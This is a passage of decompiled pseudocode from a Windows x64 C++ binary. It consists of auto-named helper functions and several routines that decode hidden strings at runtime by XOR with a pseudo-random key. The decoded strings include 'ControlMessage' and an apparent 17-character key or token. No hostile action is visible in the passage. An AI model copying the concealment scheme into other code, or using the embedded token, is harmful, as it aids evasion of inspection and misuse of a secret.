  *(_QWORD *)(a1 + 8) = 0i64;
  v5 = a3[1];
  a3[1] = 0i64;
  *(_QWORD *)(a1 + 8) = v5;
  *a3 = 0i64;
  *(_QWORD *)(a1 + 40) = 15i64;
  *(_QWORD *)(a1 + 32) = 0i64;
  *(_BYTE *)(a1 + 16) = 0;
  if ( a2[3] >= 0x10ui64 )
  {
    *(_QWORD *)(a1 + 16) = *a2;
    *a2 = 0i64;
  }
  else if ( a2[2] != -1i64 )
  {
    memmove((void *)(a1 + 16), a2, a2[2] + 1i64);
  }
  *(_QWORD *)(v4 + 32) = v3[2];
  *(_QWORD *)(v4 + 40) = v3[3];
  v3[3] = 15i64;
  v3[2] = 0i64;
  *(_BYTE *)v3 = 0;
  return v4;
}

//----- (0000000140005A20) ----------------------------------------------------
_QWORD *__fastcall sub_140005A20(_QWORD *a1, _QWORD *a2)
{
  __int64 v2; // rax

  *a1 = *a2;
  v2 = a2[1];
  a1[1] = v2;
  if ( v2 )
    _InterlockedIncrement((volatile signed __int32 *)(v2 + 8));
  return a1;
}

//----- (0000000140005A50) ----------------------------------------------------
_QWORD *__fastcall sub_140005A50(_QWORD *a1, _QWORD *a2)
{
  _QWORD *v2; // rbx

  a1[3] = 15i64;
  a1[2] = 0i64;
  v2 = a1;
  *(_BYTE *)a1 = 0;
  sub_140004DF0(a1, a2, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  return v2;
}

//----- (0000000140005A90) ----------------------------------------------------
__int64 __fastcall sub_140005A90(struct _Thrd_imp_t *a1, __int64 *a2)
{
  __int64 *v2; // rbx
  struct _Thrd_imp_t *v3; // rdi
  volatile signed __int32 *v4; // rbx
  __int64 (__fastcall **v6)(); // [rsp+30h] [rbp-78h]
  __int64 v7; // [rsp+50h] [rbp-58h]
  char v8; // [rsp+58h] [rbp-50h]
  volatile signed __int32 *v9; // [rsp+60h] [rbp-48h]
  void *v10; // [rsp+68h] [rbp-40h]
  __int64 v11; // [rsp+78h] [rbp-30h]
  unsigned __int64 v12; // [rsp+80h] [rbp-28h]

  v2 = a2;
  v3 = a1;
  std::_Pad::_Pad((std::_Pad *)&v6);
  v6 = &off_1400A2B88;
  v7 = *v2;
  sub_140005840((__int64)&v8, v2 + 1);
  std::_Pad::_Launch((std::_Pad *)&v6, v3);
  if ( v12 >= 0x10 )
    operator delete(v10);
  v12 = 15i64;
  v11 = 0i64;
  LOBYTE(v10) = 0;
  v4 = v9;
  if ( v9 )
  {
    if ( !_InterlockedDecrement(v9 + 2) )
    {
      (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v4 + 8i64))(v4);
      if ( !_InterlockedDecrement(v4 + 3) )
        (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v4 + 16i64))(v4);
    }
  }
  return std::_Pad::~_Pad((std::_Pad *)&v6);
}
// 1400A1718: using guessed type void std::_Pad::_Launch(std::_Pad *__hidden this, struct _Thrd_imp_t *);
// 1400A1720: using guessed type _QWORD std::_Pad::~_Pad(std::_Pad *__hidden this);
// 1400A1728: using guessed type _QWORD std::_Pad::_Pad(std::_Pad *__hidden this);
// 1400A2B88: using guessed type __int64 (__fastcall *off_1400A2B88)();

//----- (0000000140005B90) ----------------------------------------------------
_QWORD *__fastcall sub_140005B90(_QWORD *a1, __int64 a2, _QWORD *a3, _QWORD *a4)
{
  _QWORD *v4; // rbx

  *a1 = a2;
  v4 = a1;
  sub_140005900((__int64)(a1 + 1), a3, a4);
  return v4;
}

//----- (0000000140005BC0) ----------------------------------------------------
void __fastcall sub_140005BC0(__int64 a1, __int64 a2, __int64 *a3)
{
  __int64 *v3; // rbx
  __int64 *v4; // rax
  __int64 v5; // r10
  volatile signed __int32 *v6; // rbx
  volatile signed __int32 *v7; // [rsp+40h] [rbp+18h]

  v3 = a3;
  v4 = (__int64 *)sub_1400059B0(&v7);
  v5 = *v3;
  *v3 = *v4;
  *v4 = v5;
  v6 = v7;
  if ( v7 )
  {
    if ( !_InterlockedDecrement(v7 + 2) )
    {
      (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v6 + 8i64))(v6);
      if ( !_InterlockedDecrement(v6 + 3) )
        (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v6 + 16i64))(v6);
    }
  }
  sub_140008430();
}
// 1400059B0: using guessed type __int64 __fastcall sub_1400059B0(_QWORD);

//----- (0000000140005C40) ----------------------------------------------------
__int64 __fastcall sub_140005C40(__int64 a1, _QWORD *a2, _QWORD *a3, _QWORD *a4, _QWORD *a5, _QWORD *a6)
{
  _QWORD *v6; // rdi
  _QWORD *v7; // rsi
  __int64 v8; // rbx
  _QWORD *v9; // rcx
  __int64 v10; // rax
  __int64 v11; // rax
  __int64 v12; // rax
  __int64 v13; // rax
  void *v14; // rdi
  _QWORD *v15; // rax
  __int64 v16; // rax
  char v18; // [rsp+20h] [rbp-68h]
  void *Src; // [rsp+40h] [rbp-48h]
  unsigned __int64 v20; // [rsp+58h] [rbp-30h]

  v6 = a4;
  v7 = a3;
  v8 = a1;
  v18 = 0;
  *(_QWORD *)a1 = &off_1400A2B80;
  *(_BYTE *)(a1 + 8) = 0;
  v9 = (_QWORD *)(a1 + 16);
  v9[3] = 15i64;
  v9[2] = 0i64;
  *(_BYTE *)v9 = 0;
  sub_140004DF0(v9, a2, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  *(_QWORD *)(v8 + 48) = *a6;
  v10 = a6[1];
  *(_QWORD *)(v8 + 56) = v10;
  if ( v10 )
    _InterlockedIncrement((volatile signed __int32 *)(v10 + 8));
  *(_QWORD *)(v8 + 64) = *v7;
  v11 = v7[1];
  *(_QWORD *)(v8 + 72) = v11;
  if ( v11 )
    _InterlockedIncrement((volatile signed __int32 *)(v11 + 8));
  *(_QWORD *)(v8 + 80) = *v6;
  v12 = v6[1];
  *(_QWORD *)(v8 + 88) = v12;
  if ( v12 )
    _InterlockedIncrement((volatile signed __int32 *)(v12 + 8));
  *(_QWORD *)(v8 + 96) = *a5;
  v13 = a5[1];
  *(_QWORD *)(v8 + 104) = v13;
  if ( v13 )
    _InterlockedIncrement((volatile signed __int32 *)(v13 + 8));
  v14 = operator new(0x28ui64);
  if ( v14 )
  {
    v15 = sub_1400067C0(&Src);
    v18 = 1;
    v16 = sub_14000DBF0((__int64)v14, v15);
  }
  else
  {
    v16 = 0i64;
  }
  *(_QWORD *)(v8 + 112) = v16;
  *(_QWORD *)(v8 + 120) = 0i64;
  sub_140005BC0(v8 + 112, v16, (__int64 *)(v8 + 120));
  if ( v18 & 1 && v20 >= 0x10 )
    operator delete(Src);
  *(_DWORD *)(v8 + 136) = 0;
  return v8;
}
// 1400A2B80: using guessed type __int64 (__fastcall *off_1400A2B80)(void *);

//----- (0000000140005DB0) ----------------------------------------------------
void __fastcall sub_140005DB0(__int64 a1)
{
  __int64 v1; // rbx
  volatile signed __int32 *v2; // rbx

  v1 = a1;
  if ( *(_QWORD *)(a1 + 48) >= 0x10ui64 )
    operator delete(*(void **)(a1 + 24));
  *(_QWORD *)(v1 + 48) = 15i64;
  *(_QWORD *)(v1 + 40) = 0i64;
  *(_BYTE *)(v1 + 24) = 0;
  v2 = *(volatile signed __int32 **)(v1 + 16);
  if ( v2 && !_InterlockedDecrement(v2 + 2) )
  {
    (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v2 + 8i64))(v2);
    if ( !_InterlockedDecrement(v2 + 3) )
      (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v2 + 16i64))(v2);
  }
}

//----- (0000000140005E20) ----------------------------------------------------
__int64 __fastcall sub_140005E20(__int64 a1)
{
  __int64 v1; // rdi
  volatile signed __int32 *v2; // rbx

  v1 = a1;
  if ( *(_QWORD *)(a1 + 80) >= 0x10ui64 )
    operator delete(*(void **)(a1 + 56));
  *(_QWORD *)(v1 + 80) = 15i64;
  *(_QWORD *)(v1 + 72) = 0i64;
  *(_BYTE *)(v1 + 56) = 0;
  v2 = *(volatile signed __int32 **)(v1 + 48);
  if ( v2 )
  {
    if ( !_InterlockedDecrement(v2 + 2) )
    {
      (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v2 + 8i64))(v2);
      if ( !_InterlockedDecrement(v2 + 3) )
        (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v2 + 16i64))(v2);
    }
  }
  return std::_Pad::~_Pad((std::_Pad *)v1);
}
// 1400A1720: using guessed type _QWORD std::_Pad::~_Pad(std::_Pad *__hidden this);

//----- (0000000140005EB0) ----------------------------------------------------
void __fastcall sub_140005EB0(void **a1)
{
  void **v1; // rbx

  v1 = a1;
  sub_140007CF0(a1);
  operator delete(*v1);
  *v1 = 0i64;
}

//----- (0000000140005EE0) ----------------------------------------------------
void __fastcall sub_140005EE0(__int64 a1)
{
  __int64 v1; // rbx

  v1 = a1;
  if ( *(_QWORD *)(a1 + 64) >= 0x10ui64 )
    operator delete(*(void **)(a1 + 40));
  *(_QWORD *)(v1 + 64) = 15i64;
  *(_QWORD *)(v1 + 56) = 0i64;
  *(_BYTE *)(v1 + 40) = 0;
  if ( *(_QWORD *)(v1 + 32) >= 0x10ui64 )
    operator delete(*(void **)(v1 + 8));
  *(_QWORD *)(v1 + 32) = 15i64;
  *(_QWORD *)(v1 + 24) = 0i64;
  *(_BYTE *)(v1 + 8) = 0;
}

//----- (0000000140005F40) ----------------------------------------------------
void __fastcall sub_140005F40(_QWORD *a1)
{
  _QWORD *v1; // rbx
  volatile signed __int32 *v2; // rsi
  volatile signed __int32 *v3; // rsi
  volatile signed __int32 *v4; // rsi
  volatile signed __int32 *v5; // rsi
  volatile signed __int32 *v6; // rsi

  v1 = a1;
  *a1 = &off_1400A2B80;
  sub_1400078E0((__int64)a1);
  if ( *((_DWORD *)v1 + 34) )
    terminate();
  v2 = (volatile signed __int32 *)v1[15];
  if ( v2 )
  {
    if ( !_InterlockedDecrement(v2 + 2) )
    {
      (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v2 + 8i64))(v2);
      if ( !_InterlockedDecrement(v2 + 3) )
        (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v2 + 16i64))(v2);
    }
  }
  v3 = (volatile signed __int32 *)v1[13];
  if ( v3 )
  {
    if ( !_InterlockedDecrement(v3 + 2) )
    {
      (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v3 + 8i64))(v3);
      if ( !_InterlockedDecrement(v3 + 3) )
        (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v3 + 16i64))(v3);
    }
  }
  v4 = (volatile signed __int32 *)v1[11];
  if ( v4 )
  {
    if ( !_InterlockedDecrement(v4 + 2) )
    {
      (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v4 + 8i64))(v4);
      if ( !_InterlockedDecrement(v4 + 3) )
        (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v4 + 16i64))(v4);
    }
  }
  v5 = (volatile signed __int32 *)v1[9];
  if ( v5 )
  {
    if ( !_InterlockedDecrement(v5 + 2) )
    {
      (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v5 + 8i64))(v5);
      if ( !_InterlockedDecrement(v5 + 3) )
        (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v5 + 16i64))(v5);
    }
  }
  v6 = (volatile signed __int32 *)v1[7];
  if ( v6 )
  {
    if ( !_InterlockedDecrement(v6 + 2) )
    {
      (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v6 + 8i64))(v6);
      if ( !_InterlockedDecrement(v6 + 3) )
        (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v6 + 16i64))(v6);
    }
  }
  if ( v1[5] >= 0x10ui64 )
    operator delete((void *)v1[2]);
  v1[5] = 15i64;
  v1[4] = 0i64;
  *((_BYTE *)v1 + 16) = 0;
}
// 1400A1A58: using guessed type void terminate(void);
// 1400A2B80: using guessed type __int64 (__fastcall *off_1400A2B80)(void *);

//----- (0000000140006080) ----------------------------------------------------
void __fastcall sub_140006080(__int64 a1)
{
  __int64 v1; // rbx

  v1 = a1;
  if ( *(_QWORD *)(a1 + 48) >= 0x10ui64 )
    operator delete(*(void **)(a1 + 24));
  *(_QWORD *)(v1 + 48) = 15i64;
  *(_QWORD *)(v1 + 40) = 0i64;
  *(_BYTE *)(v1 + 24) = 0;
}

//----- (00000001400060C0) ----------------------------------------------------
__int64 (__fastcall **__fastcall sub_1400060C0(__int64 a1))()
{
  __int64 v1; // rbx

  v1 = a1;
  *(_QWORD *)a1 = &off_1400A2B70;
  if ( *(_QWORD *)(a1 + 32) >= 0x10ui64 )
    operator delete(*(void **)(a1 + 8));
  *(_QWORD *)(v1 + 32) = 15i64;
  *(_QWORD *)(v1 + 24) = 0i64;
  *(_BYTE *)(v1 + 8) = 0;
  return sub_14007E240((_QWORD *)v1);
}
// 1400A2B70: using guessed type __int64 (__fastcall *off_1400A2B70)(void *);

//----- (0000000140006110) ----------------------------------------------------
void __fastcall sub_140006110(__int64 a1)
{
  __int64 v1; // rbx

  v1 = a1;
  if ( *(_QWORD *)(a1 + 24) >= 0x10ui64 )
    operator delete(*(void **)a1);
  *(_QWORD *)(v1 + 24) = 15i64;
  *(_QWORD *)(v1 + 16) = 0i64;
  *(_BYTE *)v1 = 0;
}

//----- (0000000140006150) ----------------------------------------------------
void __fastcall sub_140006150(__int64 a1)
{
  __int64 v1; // rdi

  v1 = a1;
  if ( *(_QWORD *)(a1 + 176) >= 0x10ui64 )
    operator delete(*(void **)(a1 + 152));
  *(_QWORD *)(v1 + 176) = 15i64;
  *(_QWORD *)(v1 + 168) = 0i64;
  *(_BYTE *)(v1 + 152) = 0;
  if ( *(_QWORD *)(v1 + 104) >= 0x10ui64 )
    operator delete(*(void **)(v1 + 80));
  *(_QWORD *)(v1 + 104) = 15i64;
  *(_QWORD *)(v1 + 96) = 0i64;
  *(_BYTE *)(v1 + 80) = 0;
  sub_140007D70((_QWORD *)(v1 + 40));
  operator delete(*(void **)(v1 + 40));
  *(_QWORD *)(v1 + 40) = 0i64;
  sub_140007CF0((_QWORD *)v1);
  operator delete(*(void **)v1);
  *(_QWORD *)v1 = 0i64;
}

//----- (00000001400061F0) ----------------------------------------------------
void __fastcall sub_1400061F0(__int64 a1)
{
  if ( *(_DWORD *)(a1 + 8) )
    terminate();
}
// 1400A1A58: using guessed type void terminate(void);

//----- (0000000140006210) ----------------------------------------------------
void *__fastcall sub_140006210(void *a1, char a2)
{
  char v2; // bl
  void *v3; // rdi

  v2 = a2;
  v3 = a1;
  sub_140005F40(a1);
  if ( v2 & 1 )
    operator delete(v3);
  return v3;
}

//----- (0000000140006240) ----------------------------------------------------
_QWORD *__fastcall sub_140006240(void *a1, char a2)
{
  char v2; // di
  _QWORD *v3; // rbx

  v2 = a2;
  v3 = a1;
  *(_QWORD *)a1 = &off_1400A2B70;
  if ( *((_QWORD *)a1 + 4) >= 0x10ui64 )
    operator delete(*((void **)a1 + 1));
  v3[4] = 15i64;
  v3[3] = 0i64;
  *((_BYTE *)v3 + 8) = 0;
  sub_14007E240(v3);
  if ( v2 & 1 )
    operator delete(v3);
  return v3;
}
// 1400A2B70: using guessed type __int64 (__fastcall *off_1400A2B70)(void *);

//----- (00000001400062B0) ----------------------------------------------------
_WORD *__fastcall sub_1400062B0(void *Src)
{
  int v1; // er10
  unsigned int v2; // edi
  _WORD *v3; // rbx
  int v4; // er9
  char v5; // r9
  _WORD *v6; // rax
  bool v7; // cf
  _WORD *v8; // rax
  __int64 v9; // rdx
  _WORD *v10; // r8
  char v11; // al
  char v12; // cl

  v1 = dword_1400D9978;
  v2 = 0;
  v3 = Src;
  if ( dword_1400D9978 & 1 )
  {
    v5 = byte_1400D9976;
  }
  else
  {
    v4 = 69069 * dword_1400D991C + 1234567;
    v1 = dword_1400D9978 | 1;
    dword_1400D991C = v4;
    dword_1400D9978 |= 1u;
    dword_1400D990C = HIWORD(dword_1400D990C) + 36969 * (unsigned __int16)dword_1400D990C;
    LOBYTE(v4) = (BYTE2(dword_1400D9920) + 80 * dword_1400D9920) ^ v4;
    dword_1400D9920 = HIWORD(dword_1400D9920) + 18000 * (unsigned __int16)dword_1400D9920;
    v5 = (((unsigned int)dword_1400D9918 >> 13) ^ 32 * dword_1400D9918 ^ dword_1400D9918) + v4;
    dword_1400D9918 ^= ((unsigned int)dword_1400D9918 >> 13) ^ 32 * (dword_1400D9918 ^ (dword_1400D9918 << 12));
    byte_1400D9976 = v5;
  }
  if ( !(v1 & 2) )
  {
    dword_1400D9978 = v1 | 2;
    byte_1400D997C[0] = v5 ^ 0x63;
    byte_1400D997D = (v5 - 1) ^ 0x74;
  }
  *((_QWORD *)Src + 3) = 15i64;
  *((_QWORD *)Src + 2) = 0i64;
  *(_BYTE *)Src = 0;
  if ( *((_QWORD *)Src + 3) < 2ui64 )
  {
    sub_140004790(Src, 2ui64, 0i64);
    v5 = byte_1400D9976;
  }
  if ( *((_QWORD *)v3 + 3) < 0x10ui64 )
    v6 = v3;
  else
    v6 = *(_WORD **)v3;
  *v6 = 0;
  v7 = *((_QWORD *)v3 + 3) < 0x10ui64;
  *((_QWORD *)v3 + 2) = 2i64;
  if ( v7 )
    v8 = v3;
  else
    v8 = *(_WORD **)v3;
  *((_BYTE *)v8 + 2) = 0;
  v9 = 0i64;
  do
  {
    if ( *((_QWORD *)v3 + 3) < 0x10ui64 )
      v10 = v3;
    else
      v10 = *(_WORD **)v3;
    v11 = byte_1400D997C[v9++];
    v12 = v5 - v2++;
    *((_BYTE *)v10 + v9 - 1) = v12 ^ v11;
  }
  while ( v2 < 2 );
  return v3;
}
// 1400D990C: using guessed type int dword_1400D990C;
// 1400D9918: using guessed type int dword_1400D9918;
// 1400D991C: using guessed type int dword_1400D991C;
// 1400D9920: using guessed type int dword_1400D9920;
// 1400D9976: using guessed type char byte_1400D9976;
// 1400D9978: using guessed type int dword_1400D9978;
// 1400D997D: using guessed type char byte_1400D997D;

//----- (0000000140006440) ----------------------------------------------------
_BYTE *__fastcall sub_140006440(void *Src)
{
  int v1; // er9
  _BYTE *v2; // rbx
  int v3; // er10
  char v4; // r10
  _BYTE *v5; // rax
  bool v6; // cf
  _BYTE *v7; // rax
  _BYTE *v8; // rcx

  v1 = dword_1400D9980;
  v2 = Src;
  if ( dword_1400D9980 & 1 )
  {
    v4 = byte_1400D997E;
  }
  else
  {
    v1 = dword_1400D9980 | 1;
    v3 = 69069 * dword_1400D991C + 1234567;
    dword_1400D9980 |= 1u;
    dword_1400D991C = v3;
    dword_1400D990C = HIWORD(dword_1400D990C) + 36969 * (unsigned __int16)dword_1400D990C;
    LOBYTE(v3) = (BYTE2(dword_1400D9920) + 80 * dword_1400D9920) ^ v3;
    dword_1400D9920 = HIWORD(dword_1400D9920) + 18000 * (unsigned __int16)dword_1400D9920;
    v4 = (((unsigned int)dword_1400D9918 >> 13) ^ 32 * dword_1400D9918 ^ dword_1400D9918) + v3;
    dword_1400D9918 ^= ((unsigned int)dword_1400D9918 >> 13) ^ 32 * (dword_1400D9918 ^ (dword_1400D9918 << 12));
    byte_1400D997E = v4;
  }
  if ( !(v1 & 2) )
  {
    dword_1400D9980 = v1 | 2;
    byte_1400D9984 = v4 ^ 0x63;
  }
  *((_QWORD *)Src + 3) = 15i64;
  *((_QWORD *)Src + 2) = 0i64;
  *(_BYTE *)Src = 0;
  if ( *((_QWORD *)Src + 3) < 1ui64 )
  {
    sub_140004790(Src, 1ui64, 0i64);
    v4 = byte_1400D997E;
  }
  if ( *((_QWORD *)v2 + 3) < 0x10ui64 )
    v5 = v2;
  else
    v5 = *(_BYTE **)v2;
  *v5 = 0;
  v6 = *((_QWORD *)v2 + 3) < 0x10ui64;
  *((_QWORD *)v2 + 2) = 1i64;
  if ( v6 )
    v7 = v2;
  else
    v7 = *(_BYTE **)v2;
  v7[1] = 0;
  if ( *((_QWORD *)v2 + 3) < 0x10ui64 )
    v8 = v2;
  else
    v8 = *(_BYTE **)v2;
  *v8 = v4 ^ byte_1400D9984;
  return v2;
}
// 1400D990C: using guessed type int dword_1400D990C;
// 1400D9918: using guessed type int dword_1400D9918;
// 1400D991C: using guessed type int dword_1400D991C;
// 1400D9920: using guessed type int dword_1400D9920;
// 1400D997E: using guessed type char byte_1400D997E;
// 1400D9980: using guessed type int dword_1400D9980;
// 1400D9984: using guessed type char byte_1400D9984;

//----- (00000001400065A0) ----------------------------------------------------
_QWORD *__fastcall sub_1400065A0(void *Src)
{
  int v1; // er10
  unsigned int v2; // edi
  _QWORD *v3; // rbx
  int v4; // er9
  char v5; // r9
  _QWORD *v6; // rax
  bool v7; // cf
  _QWORD *v8; // rax
  __int64 v9; // rdx
  _QWORD *v10; // r8
  char v11; // al
  char v12; // cl

  v1 = dword_1400D9964;
  v2 = 0;
  v3 = Src;
  if ( dword_1400D9964 & 1 )
  {
    v5 = byte_1400D9963;
  }
  else
  {
    v4 = 69069 * dword_1400D991C + 1234567;
    v1 = dword_1400D9964 | 1;
    dword_1400D991C = v4;
    dword_1400D9964 |= 1u;
    dword_1400D990C = HIWORD(dword_1400D990C) + 36969 * (unsigned __int16)dword_1400D990C;
    LOBYTE(v4) = (BYTE2(dword_1400D9920) + 80 * dword_1400D9920) ^ v4;
    dword_1400D9920 = HIWORD(dword_1400D9920) + 18000 * (unsigned __int16)dword_1400D9920;
    v5 = (((unsigned int)dword_1400D9918 >> 13) ^ 32 * dword_1400D9918 ^ dword_1400D9918) + v4;
    dword_1400D9918 ^= ((unsigned int)dword_1400D9918 >> 13) ^ 32 * (dword_1400D9918 ^ (dword_1400D9918 << 12));
    byte_1400D9963 = v5;
  }
  if ( !(v1 & 2) )
  {
    dword_1400D9964 = v1 | 2;
    byte_1400D9968[0] = v5 ^ 0x43;
    byte_1400D9969 = (v5 - 1) ^ 0x6F;
    byte_1400D996A = (v5 - 2) ^ 0x6E;
    byte_1400D996B = (v5 - 3) ^ 0x74;
    byte_1400D996C = (v5 - 4) ^ 0x72;
    byte_1400D996D = (v5 - 5) ^ 0x6F;
    byte_1400D996E = (v5 - 6) ^ 0x6C;
    byte_1400D996F = (v5 - 7) ^ 0x4D;
    byte_1400D9970 = (v5 - 8) ^ 0x65;
    byte_1400D9971 = (v5 - 9) ^ 0x73;
    byte_1400D9972 = (v5 - 10) ^ 0x73;
    byte_1400D9973 = (v5 - 11) ^ 0x61;
    byte_1400D9974 = (v5 - 12) ^ 0x67;
    byte_1400D9975 = (v5 - 13) ^ 0x65;
  }
  *((_QWORD *)Src + 3) = 15i64;
  *((_QWORD *)Src + 2) = 0i64;
  *(_BYTE *)Src = 0;
  if ( *((_QWORD *)Src + 3) < 0xEui64 )
  {
    sub_140004790(Src, 0xEui64, 0i64);
    v5 = byte_1400D9963;
  }
  if ( v3[3] < 0x10ui64 )
    v6 = v3;
  else
    v6 = (_QWORD *)*v3;
  *v6 = 0i64;
  *((_DWORD *)v6 + 2) = 0;
  *((_WORD *)v6 + 6) = 0;
  v7 = v3[3] < 0x10ui64;
  v3[2] = 14i64;
  if ( v7 )
    v8 = v3;
  else
    v8 = (_QWORD *)*v3;
  *((_BYTE *)v8 + 14) = 0;
  v9 = 0i64;
  do
  {
    if ( v3[3] < 0x10ui64 )
      v10 = v3;
    else
      v10 = (_QWORD *)*v3;
    v11 = byte_1400D9968[v9++];
    v12 = v5 - v2++;
    *((_BYTE *)v10 + v9 - 1) = v12 ^ v11;
  }
  while ( v2 < 0xE );
  return v3;
}
// 1400D990C: using guessed type int dword_1400D990C;
// 1400D9918: using guessed type int dword_1400D9918;
// 1400D991C: using guessed type int dword_1400D991C;
// 1400D9920: using guessed type int dword_1400D9920;
// 1400D9963: using guessed type char byte_1400D9963;
// 1400D9964: using guessed type int dword_1400D9964;
// 1400D9969: using guessed type char byte_1400D9969;
// 1400D996A: using guessed type char byte_1400D996A;
// 1400D996B: using guessed type char byte_1400D996B;
// 1400D996C: using guessed type char byte_1400D996C;
// 1400D996D: using guessed type char byte_1400D996D;
// 1400D996E: using guessed type char byte_1400D996E;
// 1400D996F: using guessed type char byte_1400D996F;
// 1400D9970: using guessed type char byte_1400D9970;
// 1400D9971: using guessed type char byte_1400D9971;
// 1400D9972: using guessed type char byte_1400D9972;
// 1400D9973: using guessed type char byte_1400D9973;
// 1400D9974: using guessed type char byte_1400D9974;
// 1400D9975: using guessed type char byte_1400D9975;

//----- (00000001400067C0) ----------------------------------------------------
_QWORD *__fastcall sub_1400067C0(void *Src)
{
  int v1; // er10
  unsigned int v2; // edi
  _QWORD *v3; // rbx
  int v4; // er9
  char v5; // r9
  _QWORD *v6; // rax
  bool v7; // cf
  _QWORD *v8; // rax
  __int64 v9; // rdx
  _QWORD *v10; // r8
  char v11; // al
  char v12; // cl

  v1 = dword_1400D9928;
  v2 = 0;
  v3 = Src;
  if ( dword_1400D9928 & 1 )
  {
    v5 = byte_1400D9924;
  }
  else
  {
    v4 = 69069 * dword_1400D991C + 1234567;
    v1 = dword_1400D9928 | 1;
    dword_1400D991C = v4;
    dword_1400D9928 |= 1u;
    dword_1400D990C = HIWORD(dword_1400D990C) + 36969 * (unsigned __int16)dword_1400D990C;
    LOBYTE(v4) = (BYTE2(dword_1400D9920) + 80 * dword_1400D9920) ^ v4;
    dword_1400D9920 = HIWORD(dword_1400D9920) + 18000 * (unsigned __int16)dword_1400D9920;
    v5 = (((unsigned int)dword_1400D9918 >> 13) ^ 32 * dword_1400D9918 ^ dword_1400D9918) + v4;
    dword_1400D9918 ^= ((unsigned int)dword_1400D9918 >> 13) ^ 32 * (dword_1400D9918 ^ (dword_1400D9918 << 12));
    byte_1400D9924 = v5;
  }
  if ( !(v1 & 2) )
  {
    dword_1400D9928 = v1 | 2;
    byte_1400D9930[0] = v5 ^ 0x76;
    byte_1400D9931 = (v5 - 1) ^ 0x74;
    byte_1400D9932 = (v5 - 2) ^ 0x78;
    byte_1400D9933 = (v5 - 3) ^ 0x6F;
    byte_1400D9934 = (v5 - 4) ^ 0x4B;
    byte_1400D9935 = (v5 - 5) ^ 0x6E;
    byte_1400D9936 = (v5 - 6) ^ 0x50;
    byte_1400D9937 = (v5 - 7) ^ 0x67;
    byte_1400D9938 = (v5 - 8) ^ 0x51;
    byte_1400D9939 = (v5 - 9) ^ 0x5A;
    byte_1400D993A = (v5 - 10) ^ 0x31;
    byte_1400D993B = (v5 - 11) ^ 0x4E;
    byte_1400D993C = (v5 - 12) ^ 0x69;
    byte_1400D993D = (v5 - 13) ^ 0x55;
    byte_1400D993E = (v5 - 14) ^ 0x6F;
    byte_1400D993F = (v5 - 15) ^ 0x68;
    byte_1400D9940 = (v5 - 16) ^ 0x61;
  }
  *((_QWORD *)Src + 3) = 15i64;
  *((_QWORD *)Src + 2) = 0i64;
  *(_BYTE *)Src = 0;
  if ( *((_QWORD *)Src + 3) < 0x11ui64 )
  {
    sub_140004790(Src, 0x11ui64, 0i64);
    v5 = byte_1400D9924;
  }
  if ( v3[3] < 0x10ui64 )
    v6 = v3;
  else
    v6 = (_QWORD *)*v3;
  *v6 = 0i64;
  v6[1] = 0i64;
  *((_BYTE *)v6 + 16) = 0;
  v7 = v3[3] < 0x10ui64;
  v3[2] = 17i64;
  if ( v7 )
    v8 = v3;
  else
    v8 = (_QWORD *)*v3;
  *((_BYTE *)v8 + 17) = 0;
  v9 = 0i64;
  do
  {
    if ( v3[3] < 0x10ui64 )
      v10 = v3;
    else
      v10 = (_QWORD *)*v3;
    v11 = byte_1400D9930[v9++];
    v12 = v5 - v2++;
    *((_BYTE *)v10 + v9 - 1) = v12 ^ v11;
  }
  while ( v2 < 0x11 );
  return v3;
}
// 1400D990C: using guessed type int dword_1400D990C;
// 1400D9918: using guessed type int dword_1400D9918;
// 1400D991C: using guessed type int dword_1400D991C;
// 1400D9920: using guessed type int dword_1400D9920;
// 1400D9924: using guessed type char byte_1400D9924;
// 1400D9928: using guessed type int dword_1400D9928;
// 1400D9931: using guessed type char byte_1400D9931;
// 1400D9932: using guessed type char byte_1400D9932;
// 1400D9933: using guessed type char byte_1400D9933;
// 1400D9934: using guessed type char byte_1400D9934;
// 1400D9935: using guessed type char byte_1400D9935;
// 1400D9936: using guessed type char byte_1400D9936;
// 1400D9937: using guessed type char byte_1400D9937;
// 1400D9938: using guessed type char byte_1400D9938;
// 1400D9939: using guessed type char byte_1400D9939;
// 1400D993A: using guessed type char byte_1400D993A;
// 1400D993B: using guessed type char byte_1400D993B;
// 1400D993C: using guessed type char byte_1400D993C;
// 1400D993D: using guessed type char byte_1400D993D;
// 1400D993E: using guessed type char byte_1400D993E;
// 1400D993F: using guessed type char byte_1400D993F;
// 1400D9940: using guessed type char byte_1400D9940;

//----- (0000000140006A10) ----------------------------------------------------
char *sub_140006A10()
{
  int v0; // er9
  int v1; // er10
  char v2; // r10
  char *result; // rax
  unsigned int v4; // ecx
  __int64 v5; // r9
  char v6; // r8
  char v7; // dl

  v0 = dword_1400D9990;
  if ( dword_1400D9990 & 1 )
  {
    v2 = byte_1400D998E;
  }
  else
  {
    v1 = 69069 * dword_1400D991C + 1234567;
    v0 = dword_1400D9990 | 1;
    dword_1400D991C = v1;
    dword_1400D9990 |= 1u;
    dword_1400D990C = HIWORD(dword_1400D990C) + 36969 * (unsigned __int16)dword_1400D990C;
    LOBYTE(v1) = (BYTE2(dword_1400D9920) + 80 * dword_1400D9920) ^ v1;
    dword_1400D9920 = HIWORD(dword_1400D9920) + 18000 * (unsigned __int16)dword_1400D9920;
    v2 = (((unsigned int)dword_1400D9918 >> 13) ^ 32 * dword_1400D9918 ^ dword_1400D9918) + v1;
